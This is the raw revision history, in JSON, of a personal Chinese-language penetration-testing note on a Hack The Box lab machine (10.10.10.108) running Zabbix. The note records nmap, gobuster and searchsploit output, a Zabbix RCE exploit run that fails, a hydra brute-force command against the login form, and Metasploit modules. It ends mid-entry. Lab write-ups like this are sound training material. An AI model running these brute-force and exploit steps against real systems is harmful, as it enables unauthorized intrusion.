{"compress":true,"commitItems":[["a6f8d930-d623-4775-9612-3a7d21eb6219",1552994970237,"",[[1552994912546,["whale@Whale",[[1,0,"108\n===\n\n\n"]],[0,0],[10,10]]],[1552995591199,["whale@Whale",[[1,10,"22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey: \r\n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\r\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\r\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\r\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\r\n|_http-server-header: Apache/2.4.29 (Ubuntu)\r\n|_http-title: Apache2 Ubuntu Default Page: It works\r\n10050/tcp open  tcpwrapped\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n"]],[10,10],[546,546]]]]],["330baf1b-8b1f-4205-a108-34c5ad1f37a3",1553257148111,"108\n===\n\n\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n\n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n",[[1553257123358,["whale@Whale",[[1,546,"\n\ngobuster -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /dev"]],[546,546],[646,646]]],[1553257137822,["whale@Whale",[[-1,575,"79"]],[577,577],[575,575]]],[1553257139676,["whale@Whale",[[1,575,"108"]],[575,575],[578,578]]],[1553257141756,["whale@Whale",[[-1,643,"/dev"]],[643,647],[643,643]]],[1553257748817,[null,[[-1,547,"\n"],[1,575,"."],[-1,578,"9"],[-1,643,"v"],[1,644," \n"]],[547,547],[646,646]]],[1553257748817,[null,[[1,547,"\n"],[-1,574,"."],[1,578,"9"],[1,642,"v"],[-1,642," \n"]],[646,646],[547,547]]],[1553257734709,["whale@Whale",[[1,644,"\n"]],[643,643],[644,644]]],[1553257744579,["whale@Whale",[[-1,644,"\n"],[1,645,"wget http://10.10.10.108"]],[644,644],[668,668]]],[1553257808799,[null,[[-1,547,"\n"],[1,575,"."],[-1,578,"9"],[-1,643,"v"],[1,644," \n"]],[547,547],[646,646]]],[1553257808799,[null,[[1,547,"\n"],[-1,574,"."],[1,578,"9"],[1,642,"v"],[-1,642," \n"]],[646,646],[547,547]]],[1553257765230,["whale@Whale",[[1,668,"\n\nwget http://10.10.10.108:10050"]],[668,668],[699,699]]],[1553258112841,[null,[[-1,547,"\n"],[1,575,"."],[-1,578,"9"],[-1,643,"v"],[1,644," \n"],[-1,668,"\n"],[1,700,"\n"]],[547,547],[701,701]]],[1553258112841,[null,[[1,547,"\n"],[-1,574,"."],[1,578,"9"],[1,642,"v"],[-1,642," \n"],[1,668,"\n"],[-1,699,"\n"]],[701,701],[547,547]]],[1553258062810,["whale@Whale",[[-1,669,"wget http://10.10.10.108:10050"]],[669,699],[669,669]]],[1553258064413,["whale@Whale",[[-1,546,"\n"]],[546,546],[545,545]]],[1553258068077,["whale@Whale",[[1,9,"·"]],[9,9],[10,10]]],[1553258069569,["whale@Whale",[[-1,9,"·"]],[9,10],[9,9]]],[1553258071248,["whale@Whale",[[1,9,"```"]],[9,9],[12,12]]],[1553258073435,["whale@Whale",[[1,548,"```"]],[548,548],[551,551]]],[1553258079185,["whale@Whale",[[1,552,"\n"]],[551,551],[552,552]]],[1553258093851,["whale@Whale",[[1,553,"\n"]],[552,552],[553,553]]],[1553258094487,["whale@Whale",[[-1,553,"\n"]],[553,553],[552,552]]],[1553258094923,["whale@Whale",[[-1,552,"\n"]],[552,552],[551,551]]],[1553258095644,["whale@Whale",[[1,675,"\n"]],[673,673],[674,674]]],[1553258095873,["whale@Whale",[[1,676,"\n"]],[674,674],[675,675]]],[1553258097452,["whale@Whale",[[1,675,"ssh root@10.10.10.108\r\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\r\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\r\nAre you sure you want to continue connecting (yes/no)? yes\r\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\r\nroot@10.10.10.108: Permission denied (publickey)."]],[675,675],[1042,1042]]],[1553258355808,[null,[[-1,552,"\n"],[1,580,"."],[-1,583,"9"],[-1,648,"v"],[1,649," \n"],[-1,674,"0"],[1,675,"\n"],[-1,696,"\r"],[1,697,"\n"],[-1,774,"\r"],[1,775,"\n"],[-1,852,"\r"],[1,853,"\n"],[-1,912,"\r"],[1,913,"\n"],[-1,991,"\r"],[1,992,"\n"]],[552,552],[993,993]]],[1553258355808,[null,[[1,552,"\n"],[-1,579,"."],[1,583,"9"],[1,647,"v"],[-1,647," \n"],[1,674,"0"],[-1,674,"\n"],[1,696,"\r"],[-1,696,"\n"],[1,774,"\r"],[-1,774,"\n"],[1,852,"\r"],[-1,852,"\n"],[1,912,"\r"],[-1,912,"\n"],[1,991,"\r"],[-1,991,"\n"]],[993,993],[552,552]]],[1553258325814,["whale@Whale",[[1,675,"\n"],[-1,696,"\r"],[-1,774,"\r"],[-1,852,"\r"],[-1,912,"\r"],[-1,991,"\r"]],[674,674],[675,675]]],[1553258326606,["whale@Whale",[[1,675,"```"]],[675,675],[678,678]]],[1553258329496,["whale@Whale",[[1,1042,"```"]],[1042,1042],[1045,1045]]],[1553258330381,["whale@Whale",[[1,1046,"\n"]],[1045,1045],[1046,1046]]],[1553258331732,["whale@Whale",[[-1,1046,"\n"],[1,1047,"j"]],[1046,1046],[1047,1047]]],[1553258332687,["whale@Whale",[[-1,1046,"j"],[1,1047,"\n"]],[1047,1047],[1046,1046]]],[1553258349715,["whale@Whale",[[-1,1046,"\n"],[1,1047,"拒绝密码连接，要么通过web获取到id_rsasi"]],[1046,1046],[1071,1071]]],[1553258350281,["whale@Whale",[[-1,1069,"si"]],[1071,1071],[1069,1069]]],[1553258355557,["whale@Whale",[[1,1069,"通过私钥连接；"]],[1069,1069],[1076,1076]]],[1553258415804,[null,[[-1,552,"\n"],[1,580,"."],[-1,583,"9"],[-1,648,"v"],[1,649," \n"],[-1,674,"0"],[1,675,"\n"]],[552,552],[676,676]]],[1553258415804,[null,[[1,552,"\n"],[-1,579,"."],[1,583,"9"],[1,647,"v"],[-1,647," \n"],[1,674,"0"],[-1,674,"\n"]],[676,676],[552,552]]],[1553258367036,["whale@Whale",[[1,1076,"要么web远程代码执行获得webshell。"]],[1076,1076],[1098,1098]]],[1553258367779,["whale@Whale",[[1,1098,"\n\n"]],[1098,1098],[1099,1099]]],[1553258377353,["whale@Whale",[[-1,552,"gobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \nwget http://10.10.10.108"]],[552,673],[552,552]]],[1553258379031,["whale@Whale",[[-1,553,"\n"]],[552,552],[551,551]]],[1553258387536,["whale@Whale",[[1,552,"## web"]],[552,552],[558,558]]],[1553258389526,["whale@Whale",[[-1,555,"web"]],[558,558],[555,555]]],[1553258391420,["whale@Whale",[[1,555,"ssh"]],[555,555],[558,558]]],[1553258393670,["whale@Whale",[[1,984,"\n"]],[983,983],[984,984]]],[1553258396106,["whale@Whale",[[-1,984,"\n"],[1,985,"## 8"]],[984,984],[988,988]]],[1553258396573,["whale@Whale",[[-1,987,"8"]],[988,988],[987,987]]],[1553258397185,["whale@Whale",[[1,987,"web"]],[987,987],[990,990]]],[1553258397536,["whale@Whale",[[1,990,"\n\n"]],[990,990],[991,991]]],[1553258397773,["whale@Whale",[[1,992,"\n"]],[991,991],[992,992]]],[1553258398106,["whale@Whale",[[1,992,"gobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \nwget http://10.10.10.108"]],[992,992],[1113,1113]]],[1553258434475,["whale@Whale",[[1,1089,"\n"]],[1088,1088],[1089,1089]]],[1553258435090,["whale@Whale",[[1,1089,"/zabbix (Status: 301)\r\n"]],[1089,1089],[1112,1112]]],[1553258437933,["whale@Whale",[[1,992,"\n"],[-1,1110,"\r"]],[991,991],[992,992]]],[1553258439627,["whale@Whale",[[1,992,"111"]],[992,992],[995,995]]],[1553258440741,["whale@Whale",[[-1,992,"111"]],[995,995],[992,992]]],[1553258441764,["whale@Whale",[[1,992,"```"]],[992,992],[995,995]]],[1553258447512,["whale@Whale",[[-1,1116,"wget http://10.10.10.108"]],[1116,1140],[1116,1116]]],[1553258448584,["whale@Whale",[[1,996,"\n"]],[995,995],[996,996]]],[1553258449261,["whale@Whale",[[1,996,"wget http://10.10.10.108"]],[996,996],[1020,1020]]],[1553258449688,["whale@Whale",[[1,1021,"\n"]],[1020,1020],[1021,1021]]],[1553258449699,["whale@Whale",[[1,1021,"\\"]],[1021,1021],[1022,1022]]],[1553258450458,["whale@Whale",[[-1,1021,"\\"]],[1022,1022],[1021,1021]]],[1553258451312,["whale@Whale",[[1,1021,"---"]],[1021,1021],[1024,1024]]],[1553258454378,["whale@Whale",[[1,1144,"```"]],[1144,1144],[1147,1147]]],[1553258612871,["whale@Whale",[[-1,1148,"\n"],[1,1149,"fa"]],[1122,1148],[1150,1150]]],[1553258613260,["whale@Whale",[[-1,1149,"a"]],[1150,1150],[1149,1149]]],[1553258613452,["whale@Whale",[[-1,1148,"f"],[1,1149,"\n"]],[1149,1149],[1148,1148]]],[1553258619654,["whale@Whale",[[-1,1148,"\n"],[1,1149,"发现一个登陆表单，searchsploit zabbix\r\n"]],[1148,1148],[1178,1178]]],[1553258620749,["whale@Whale",[[-1,1176,"\r"],[1,1177,","]],[1178,1178],[1177,1177]]],[1553258621279,["whale@Whale",[[-1,1176,","]],[1177,1177],[1176,1176]]],[1553258624246,["whale@Whale",[[1,1176,"，常规操作"]],[1176,1176],[1181,1181]]],[1553264600295,["whale@Whale",[[1,1123,"http://10.10.10.108/"],[-1,1129," "],[1,1130,"/"]],[1123,1130],[1150,1150]]],[1553264602133,["whale@Whale",[[-1,1123,"http://10.10.10.108/"],[1,1149," "],[-1,1149,"/"]],[1150,1150],[1123,1130]]],[1553264786095,["whale@Whale",[[1,1144,"\n"]],[1143,1143],[1144,1144]]],[1553264787627,["whale@Whale",[[1,1144,"---"]],[1144,1144],[1147,1147]]],[1553264787886,["whale@Whale",[[1,1148,"\n"]],[1147,1147],[1148,1148]]],[1553264788777,["whale@Whale",[[1,1148,"http://10.10.10.108/zabbix/history.php"]],[1148,1148],[1186,1186]]],[1553264789537,["whale@Whale",[[1,1187,"\n"]],[1186,1186],[1187,1187]]],[1553264798651,["whale@Whale",[[1,1187,"Zabbix 3.0.21"]],[1187,1187],[1200,1200]]],[1553264801384,["whale@Whale",[[1,1148,"\n"]],[1147,1147],[1148,1148]]],[1553264804796,["whale@Whale",[[1,1148,"burp spider"]],[1148,1148],[1159,1159]]],[1553264807229,["whale@Whale",[[1,1213,"\n"]],[1212,1212],[1213,1213]]],[1553264808248,["whale@Whale",[[1,1213,"---"]],[1213,1213],[1216,1216]]],[1553264809956,["whale@Whale",[[1,1217,"\n"]],[1216,1216],[1217,1217]]],[1553266668623,["whale@Whale",[[1,1217,"Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution "]],[1217,1217],[1273,1273]]],[1553266684617,["whale@Whale",[[1,1274,"\n"]],[1273,1273],[1274,1274]]],[1553266686531,["whale@Whale",[[1,1274,"-m exploits/php/webapps/39937.py"]],[1274,1274],[1306,1306]]]]],["e2e39b8e-b1f1-4e30-a17c-ecbbaf0becb8",1553310442776,"108\n===\n\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n\n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n## ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied (publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell。\n\n## web\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \n-m exploits/php/webapps/39937.py\n```\n发现一个登陆表单，searchsploit zabbix，常规操作\n",[[1553310434207,["whale@Whale",[[1,1274,"searchsploit "]],[1274,1274],[1287,1287]]],[1553311266710,["whale@Whale",[[1,1320,"\n"]],[1319,1319],[1320,1320]]],[1553311267245,["whale@Whale",[[1,1321,"\n"]],[1320,1320],[1321,1321]]],[1553311268391,["whale@Whale",[[1,1321,"---"]],[1321,1321],[1324,1324]]],[1553311268706,["whale@Whale",[[1,1325,"\n"]],[1324,1324],[1325,1325]]],[1553311271060,["whale@Whale",[[1,1325,"msf chag"]],[1325,1325],[1333,1333]]],[1553311271899,["whale@Whale",[[-1,1329,"chag"]],[1333,1333],[1329,1329]]],[1553311274280,["whale@Whale",[[1,1329,"尝试exploit/unix/misc/zabbix_agent_exec"]],[1329,1329],[1366,1366]]],[1553311275115,["whale@Whale",[[1,1367,"\n"]],[1366,1366],[1367,1367]]],[1553311283555,["whale@Whale",[[1,1367,"ip/端口10050,shi"]],[1367,1367],[1381,1381]]],[1553311284400,["whale@Whale",[[-1,1378,"shi"]],[1381,1381],[1378,1378]]],[1553311285838,["whale@Whale",[[1,1378,"失败"]],[1378,1378],[1380,1380]]],[1553311286282,["whale@Whale",[[1,1381,"\n"]],[1380,1380],[1381,1381]]],[1553311308061,["whale@Whale",[[1,1320,"http://10.10.10.108/zabbix/api_jsonrpc.php"]],[1320,1320],[1362,1362]]],[1553311310658,["whale@Whale",[[1,1320,"\n"]],[1319,1319],[1320,1320]]],[1553311313407,["whale@Whale",[[1,1320,"python "]],[1320,1320],[1327,1327]]],[1553311316036,["whale@Whale",[[-1,1320,"python "]],[1327,1327],[1320,1320]]],[1553311347341,["whale@Whale",[[1,1320,"python 39937.py "]],[1320,1320],[1336,1336]]],[1553311349259,["whale@Whale",[[1,1320,"\n"]],[1319,1319],[1320,1320]]],[1553311349999,["whale@Whale",[[1,1320,"x"]],[1320,1320],[1321,1321]]],[1553311350515,["whale@Whale",[[-1,1320,"x"]],[1321,1321],[1320,1320]]],[1553311354168,["whale@Whale",[[1,1320,"修改exp"]],[1320,1320],[1325,1325]]],[1553311356932,["whale@Whale",[[1,1320,"1. "]],[1320,1320],[1323,1323]]],[1553311358558,["whale@Whale",[[1,1328,"di"]],[1328,1328],[1330,1330]]],[1553311359118,["whale@Whale",[[-1,1328,"di"]],[1330,1330],[1328,1328]]],[1553311365863,["whale@Whale",[[1,1328,"地址为http://10.10.10.108/zabbix"]],[1328,1328],[1357,1357]]],[1553311373750,["whale@Whale",[[1,1358,"2. 运行exp:"]],[1358,1358],[1367,1367]]],[1553311374678,["whale@Whale",[[-1,1366,":"]],[1367,1367],[1366,1366]]],[1553311376417,["whale@Whale",[[1,1366,"：  "]],[1366,1366],[1369,1369]]],[1553311378042,["whale@Whale",[[1,1386,"\n"]],[1385,1385],[1386,1386]]],[1553311380543,["whale@Whale",[[1,1386,"3."]],[1386,1386],[1388,1388]]],[1553311660512,["whale@Whale",[[1,1388," 检查"]],[1388,1388],[1391,1391]]],[1553311661221,["whale@Whale",[[-1,1389,"检查"]],[1391,1391],[1389,1389]]],[1553311666959,["whale@Whale",[[1,1389,"运行出错，检查exp"]],[1389,1389],[1399,1399]]],[1553311667297,["whale@Whale",[[1,1400,"\n"]],[1399,1399],[1400,1400]]],[1553311668062,["whale@Whale",[[1,1400,"[zabbix_cmd]>>:  \r\nResult of last command:\r\nTraceback (most recent call last):\r\n  File \"39937.py\", line 55, in <module>\r\n    \"auth\" : auth['result'],\r\nKeyError: 'result'\r\n"]],[1400,1400],[1571,1571]]],[1553311684508,["whale@Whale",[[-1,1417,"\r"],[-1,1442,"\r"],[-1,1478,"\r"],[-1,1519,"\r"],[-1,1549,"\r"],[-1,1569,"\r"],[1,1572,"4. "]],[1566,1566],[1569,1569]]],[1553311686067,["whale@Whale",[[1,1611,"j"]],[1611,1611],[1612,1612]]],[1553311686666,["whale@Whale",[[-1,1611,"j"]],[1612,1612],[1611,1611]]],[1553311689604,["whale@Whale",[[1,1611,"该ip"]],[1611,1611],[1614,1614]]],[1553311691061,["whale@Whale",[[-1,1612,"ip"]],[1614,1614],[1612,1612]]],[1553311693313,["whale@Whale",[[1,1612,"地址存在"]],[1612,1612],[1616,1616]]],[1553311711355,["whale@Whale",[[1,1565,"用户名密码Admin/zabbixa"]],[1565,1565],[1583,1583]]],[1553311711841,["whale@Whale",[[-1,1582,"a"]],[1583,1583],[1582,1582]]],[1553311713277,["whale@Whale",[[1,1582,"可能是"]],[1582,1582],[1585,1585]]],[1553311725217,["whale@Whale",[[1,1585,"无效口令，尝试登陆后帝企鹅"]],[1585,1585],[1598,1598]]],[1553311726276,["whale@Whale",[[-1,1595,"帝企鹅"]],[1598,1598],[1595,1595]]],[1553311730066,["whale@Whale",[[1,1595,"的确失败"]],[1595,1595],[1599,1599]]],[1553311731830,["whale@Whale",[[1,1651,"\n"]],[1650,1650],[1651,1651]]],[1553311757372,["whale@Whale",[[1,1651,"5. http://10.10.10.108/zabbix/index.php"]],[1651,1651],[1690,1690]]],[1553311767319,["whale@Whale",[[1,1691,"\n"]],[1690,1690],[1691,1691]]],[1553311767591,["whale@Whale",[[1,1691,"name=Admin&password=zabbix&autologin=1&enter=Sign+in"]],[1691,1691],[1743,1743]]],[1553311770359,["whale@Whale",[[1,1744,"\n"]],[1743,1743],[1744,1744]]],[1553311770597,["whale@Whale",[[1,1745,"\n"]],[1744,1744],[1745,1745]]],[1553311773575,["whale@Whale",[[1,1745,"hydra -"]],[1745,1745],[1752,1752]]],[1553313490404,["whale@Whale",[[-1,1751,"-"]],[1752,1752],[1751,1751]]],[1553314331053,["whale@Whale",[[1,1812,"---"]],[1812,1812],[1815,1815]]],[1553314331259,["whale@Whale",[[1,1816,"\n"]],[1815,1815],[1816,1816]]],[1553314332109,["whale@Whale",[[1,1816,"Zabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) "]],[1816,1816],[1879,1879]]],[1553314343907,["whale@Whale",[[1,1880,"\n"]],[1879,1879],[1880,1880]]],[1553314344823,["whale@Whale",[[1,1880,"Zabbix Server 2.4.X"]],[1880,1880],[1899,1899]]],[1553314345465,["whale@Whale",[[1,1900,"\n"]],[1899,1899],[1900,1900]]],[1553314346067,["whale@Whale",[[1,1900,"---"]],[1900,1900],[1903,1903]]],[1553314346348,["whale@Whale",[[1,1904,"\n"]],[1903,1903],[1904,1904]]],[1553314397475,["whale@Whale",[[1,1904,"*   [CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)"]],[1904,1904],[1966,1966]]],[1553314400075,["whale@Whale",[[-1,1904,"*   "]],[1904,1908],[1904,1904]]],[1553314415645,["whale@Whale",[[1,1963,"\n"]],[1962,1962],[1963,1963]]],[1553314416655,["whale@Whale",[[1,1963," before 3.0.4 allows remote attackers to execute arbitrary SQL commands"]],[1963,1963],[2034,2034]]],[1553314417438,["whale@Whale",[[-1,1963," "],[1,1964," "],[1,2034,"\n"]],[2034,2034],[2035,2035]]],[1553314464107,["whale@Whale",[[1,2035,"auxiliary/gather/zabbix_toggleids_sqli"]],[2035,2035],[2073,2073]]],[1553314546889,["whale@Whale",[[1,2074,"\n"]],[2073,2073],[2074,2074]]],[1553314547938,["whale@Whale",[[1,2074,"s"]],[2074,2074],[2075,2075]]],[1553314548339,["whale@Whale",[[-1,2074,"s"]],[2075,2075],[2074,2074]]],[1553314550038,["whale@Whale",[[1,2074,"失败"]],[2074,2074],[2076,2076]]],[1553314550271,["whale@Whale",[[1,2077,"\n"]],[2076,2076],[2077,2077]]],[1553314552149,["whale@Whale",[[1,2077,"---"]],[2077,2077],[2080,2080]]],[1553314980712,["whale@Whale",[[1,1752,"\n"]],[1751,1751],[1752,1752]]],[1553314982264,["whale@Whale",[[1,1752,"```\nhydra -l falaraki -P /usr/share/wordlists/3000-pass.txt -f apocalyst.htb http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:ERROR\"\n```"]],[1752,1752],[1974,1974]]],[1553314984727,["whale@Whale",[[-1,1752,"```"]],[1752,1755],[1752,1752]]],[1553314987246,["whale@Whale",[[-1,1968,"```"]],[1968,1971],[1968,1968]]],[1553315126259,["whale@Whale",[[-1,1843,"wp-log"],[1,1849,"zabbix/"],[1,1851,"dex"]],[1842,1855],[1859,1859]]],[1553315181666,["whale@Whale",[[1,1752,"top-usernames-shortlist.txt\r\n"]],[1752,1752],[1781,1781]]],[1553315188122,["whale@Whale",[[-1,1779,"\r"],[-1,1789,"l falaraki"],[1,1799,"L"]],[1788,1798],[1788,1789]]],[1553315189469,["whale@Whale",[[1,1790," top-usernames-shortlist.txt"]],[1789,1789],[1817,1817]]],[1553315193828,["whale@Whale",[[-1,1752,"top-usernames-shortlist.txt\n"]],[1752,1780],[1752,1752]]],[1553315288841,[null,[[-1,1762," "],[1,1790," "]],[1762,1762],[1791,1791]]],[1553315288841,[null,[[1,1762," "],[-1,1789," "]],[1791,1791],[1762,1762]]],[1553315267484,["whale@Whale",[[-1,1831,"apocalyst.htb"],[1,1844,"10.10.10.108"]],[1831,1844],[1843,1843]]],[1553315273538,["whale@Whale",[[-1,1878,"log"]],[1881,1881],[1878,1878]]],[1553315276412,["whale@Whale",[[1,1878,"name"]],[1878,1878],[1882,1882]]],[1553315281259,["whale@Whale",[[-1,1890,"pwd"]],[1890,1890],[1890,1890]]],[1553315285056,["whale@Whale",[[1,1890,"password"]],[1890,1890],[1898,1898]]],[1553315348853,[null,[[-1,1762," "],[1,1790," "]],[1762,1762],[1791,1791]]],[1553315348853,[null,[[1,1762," "],[-1,1789," "]],[1791,1791],[1762,1762]]],[1553315300267,["whale@Whale",[[-1,1906,"wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1"],[1,1988,"autologin=1&enter=Sign+in\n"]],[1905,1988],[1932,1932]]],[1553315408840,[null,[[-1,1762," "],[1,1790," "]],[1762,1762],[1791,1791]]],[1553315408840,[null,[[1,1762," "],[-1,1789," "]],[1791,1791],[1762,1762]]],[1553315364937,["whale@Whale",[[-1,1933,"ERROR"],[1,1938,"incorrect"]],[1933,1938],[1942,1942]]],[1553315468844,[null,[[-1,1762," "],[1,1790," "]],[1762,1762],[1791,1791]]],[1553315468844,[null,[[1,1762," "],[-1,1789," "]],[1791,1791],[1762,1762]]],[1553315421546,["whale@Whale",[[-1,1931,"\n"]],[1932,1932],[1931,1931]]],[1553315528851,[null,[[-1,1762," "],[1,1790," "]],[1762,1762],[1791,1791]]],[1553315528851,[null,[[1,1762," "],[-1,1789," "]],[1791,1791],[1762,1762]]],[1553315478909,["whale@Whale",[[1,1762,"/usr/share/seclists/Usernames/"]],[1762,1762],[1792,1792]]],[1553315506864,["whale@Whale",[[-1,1745,"hydra \n"]],[1745,1752],[1745,1745]]],[1553315513510,["whale@Whale",[[-1,1654,"http://10.10.10.108/zabbix/index.php"]],[1654,1690],[1654,1654]]],[1553315528686,["whale@Whale",[[1,1654,"burp截包，尝试"]],[1654,1654],[1663,1663]]],[1553315588860,[null,[[-1,1758," "],[1,1786," "]],[1758,1758],[1787,1787]]],[1553315588860,[null,[[1,1758," "],[-1,1785," "]],[1787,1787],[1758,1758]]],[1553315532284,["whale@Whale",[[1,1663,"弱密码猜测"]],[1663,1663],[1668,1668]]],[1553315534481,["whale@Whale",[[-1,1723,"\n"]],[1723,1723],[1722,1722]]],[1553316369822,[null,[[-1,1762," "],[1,1790," "]],[1762,1762],[1791,1791]]],[1553316369822,[null,[[1,1762," "],[-1,1789," "]],[1791,1791],[1762,1762]]],[1553316361079,["whale@Whale",[[1,491,"2048/udp open|filtered dls-monitor no-response"]],[491,491],[537,537]]]]],["ff35af41-de54-4d90-ab33-c7d30f3b8d4a",1559205287037,"108\n===\n\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n\n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n2048/udp open|filtered dls-monitor no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n## ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied (publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell。\n\n## web\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \nsearchsploit -m exploits/php/webapps/39937.py\n1. 修改exp地址为http://10.10.10.108/zabbix\n2. 运行exp：  python 39937.py \n3. 运行出错，检查exp\n[zabbix_cmd]>>:  \nResult of last command:\nTraceback (most recent call last):\n  File \"39937.py\", line 55, in <module>\n    \"auth\" : auth['result'],\nKeyError: 'result'\n用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败\n4. http://10.10.10.108/zabbix/api_jsonrpc.php该地址存在\n5. burp截包，尝试弱密码猜测\nname=Admin&password=zabbix&autologin=1&enter=Sign+in\n\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/3000-pass.txt -f 10.10.10.108 http-post-form \"/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:incorrect\"\n\n---\nmsf 尝试exploit/unix/misc/zabbix_agent_exec\nip/端口10050,失败\n---\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \nZabbix Server 2.4.X\n---\n[CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)\n before 3.0.4 allows remote attackers to execute arbitrary SQL commands\nauxiliary/gather/zabbix_toggleids_sqli\n失败\n---\n```\n发现一个登陆表单，searchsploit zabbix，常规操作\n",[[1559205265291,["whale@Whale",[[1,1027,"，再提权"]],[1027,1027],[1031,1031]]]]],["f235c6ce-c455-465d-a26b-e05808d0e458",1559355706812,"108\n===\n\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n\n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n2048/udp open|filtered dls-monitor no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n## ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 